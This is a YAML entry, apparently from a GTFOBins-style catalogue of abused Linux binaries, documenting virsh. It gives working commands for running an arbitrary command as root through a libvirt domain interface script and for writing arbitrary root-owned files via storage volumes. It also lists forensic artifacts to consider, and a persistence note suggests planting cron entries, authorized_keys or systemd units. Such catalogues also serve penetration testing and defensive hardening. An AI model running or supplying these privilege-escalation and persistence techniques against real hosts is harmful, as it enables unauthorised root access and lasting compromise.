---
name: virsh
capabilities:
- exec
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    cat >/path/to/temp-file.xml <<EOF
    <domain type='kvm'>
      <name>x</name>
      <os>
        <type arch='x86_64'>hvm</type>
      </os>
      <memory unit='KiB'>1</memory>
      <devices>
        <interface type='ethernet'>
          <script path='/path/to/command'/>
        </interface>
      </devices>
    </domain>
    EOF
    virsh -c qemu:///system create /path/to/temp-file.xml
    virsh -c qemu:///system destroy x
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file

    cat >/path/to/temp-file.xml <<EOF
    <volume type='file'>
      <name>y</name>
      <key>/path/to/output-dir/output-file</key>
      <source>
      </source>
      <capacity unit='bytes'>5</capacity>
      <allocation unit='bytes'>4096</allocation>
      <physical unit='bytes'>5</physical>
      <target>
        <path>/path/to/output-dir/output-file</path>
        <format type='raw'/>
        <permissions>
          <mode>0600</mode>
          <owner>0</owner>
          <group>0</group>
        </permissions>
      </target>
    </volume>
    EOF

    virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
    virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
    virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
    virsh -c qemu:///system pool-destroy x
  notes: This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.
- id: file-write-2
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
    virsh -c qemu:///system vol-download --pool x input-file output-file
    virsh -c qemu:///system pool-destroy x
  notes: This requires the user to be in the `libvirt` group.
references:
- https://gtfobins.github.io/gtfobins/virsh/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
